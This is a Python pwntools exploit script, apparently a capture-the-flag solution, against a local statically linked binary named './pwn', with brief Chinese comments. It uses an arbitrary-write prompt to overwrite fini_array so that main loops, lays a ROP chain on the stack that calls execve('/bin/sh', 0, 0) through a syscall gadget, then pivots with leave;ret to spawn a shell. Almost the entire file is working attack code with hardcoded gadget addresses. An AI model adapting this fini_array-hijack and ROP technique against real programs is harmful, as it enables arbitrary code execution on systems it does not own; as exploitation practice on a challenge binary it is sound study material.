#coding:utf-8
import os
import sys
import time
from pwn import *
from ctypes import *

context.os = 'linux'
context.log_level = "debug"

#context(os = 'linux',log_level = "debug",arch = 'amd64')
s       = lambda data               :p.send(str(data))
sa      = lambda delim,data         :p.sendafter(str(delim), str(data))
sl      = lambda data               :p.sendline(str(data))
sla     = lambda delim,data         :p.sendlineafter(str(delim), str(data))
r       = lambda num                :p.recv(num)
ru      = lambda delims, drop=True  :p.recvuntil(delims, drop)
itr     = lambda                    :p.interactive()
uu32    = lambda data               :u32(data.ljust(4,b'\x00'))
uu64    = lambda data               :u64(data.ljust(8,b'\x00'))
leak    = lambda name,addr          :log.success('{} = {:#x}'.format(name, addr))
l64     = lambda      :u64(p.recvuntil("\x7f")[-6:].ljust(8,b"\x00"))
l32     = lambda      :u32(p.recvuntil("\xf7")[-4:].ljust(4,b"\x00"))
context.terminal = ['gnome-terminal','-x','sh','-c']

x64_32 = 1

if x64_32:
    context.arch = 'amd64'
else:
    context.arch = 'i386'

p=process('./pwn')

syscall = 0x0402514
rax = 0x0448fcc
rdx = 0x0448415
rsi = 0x0406f80
rdi = 0x0401746
bin_sh = 0x0492895

fini_array = 0x04B80B0
main_addr  = 0x0401C1D
libc_csu_fini = 0x0402CB0
leave_ret = 0x0401CF3

esp = 0x04B80C0
ret = 0x0401016

def duan():
    gdb.attach(p)
    pause()

def write(addr,data):
    p.sendafter('addr:',p64(addr))
    p.sendafter('data:',data)


#使程序循环跑起来       fini_array[0]   fini_array[1]
write(fini_array,p64(libc_csu_fini)+p64(main_addr))


#duan()
#布置栈上的内容为
#syscall('/bin/sh\x00',0,0)
write(esp,p64(rax))
write(esp+8,p64(0x3b)) 
write(esp+16,p64(rdi)) 
write(esp+24,p64(bin_sh))
write(esp+32,p64(rsi))
write(esp+40,p64(0))
write(esp+48,p64(rdx))
write(esp+56,p64(0))
write(esp+64,p64(syscall))

#结束程序循环,进入ROP
write(fini_array,p64(leave_ret)+p64(ret))
'''
'''
p.interactive()